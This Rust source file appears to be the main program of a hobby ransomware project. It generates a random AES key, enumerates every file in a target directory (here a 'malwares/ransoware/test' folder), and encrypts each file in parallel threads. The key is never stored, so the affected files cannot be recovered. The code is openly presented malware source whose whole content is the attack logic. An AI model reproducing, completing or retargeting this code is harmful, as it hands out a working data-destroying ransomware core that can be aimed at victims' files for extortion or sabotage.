mod controllers;
mod encrypt;

use encrypt::aes_encrypt;
use controllers::get_all_files;
use rand::{rng, RngCore};

use std::sync::{
    Arc, Mutex
};
use std::thread;
fn main() {
    let directory_path = String::from("C:/Users/W10/projects/malwares/ransoware/test");

    let mut key_32_caracter = [0u8; 32];
    
    rng()
        .fill_bytes(&mut key_32_caracter);
    
    println!("encrypt started");
    print!("encrypiting all files in {} ", directory_path);

    let all_files_path = get_all_files::get_all_files(directory_path).unwrap();
    println!("reading all files");
    println!("{} files found", all_files_path.len());

    println!("start encrypt ...");

    let mut parallel_encrypt  = vec![];

    for path in all_files_path.into_iter() {

        let thread = thread::spawn(move || {
            let _ = aes_encrypt::aes_encrypt(path, key_32_caracter);
        });
        
        parallel_encrypt.push(thread);
    }

    for thread in parallel_encrypt {
        thread.join().unwrap();
    }
    
    println!("exiting.")

}
